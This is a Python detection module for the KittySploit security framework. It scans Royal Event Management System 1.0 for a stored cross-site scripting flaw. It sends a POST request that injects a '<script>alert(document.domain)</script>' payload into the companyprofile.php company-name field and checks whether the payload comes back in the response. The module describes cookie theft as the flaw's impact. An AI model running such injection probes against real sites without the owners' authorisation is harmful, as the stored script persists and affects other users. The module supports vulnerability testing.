#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Royal Event Management System contains a stored cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Royal Event Management System - Stored Cross-Site Scripting Detection',
        'description': 'Royal Event Management System contains a stored cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'xss', 'unauthenticated', 'cms', 'royalevent', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/166479/Royale-Event-Management-System-1.0-Cross-Site-Scripting.html',
            'https://www.sourcecodester.com/sites/default/files/download/oretnom23/Royal%20Event.zip',
        ],
    }

    def run(self):
        path = '/royal_event/companyprofile.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=\n')
        if not r or r.status_code != 302:
            return False
        body = r.text or ""
        body_any = ('value="><script>alert(document.domain)</script>" >',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Royal Event Management System - Stored Cross-Site Scripting detected', path=path)
            return True
        return False

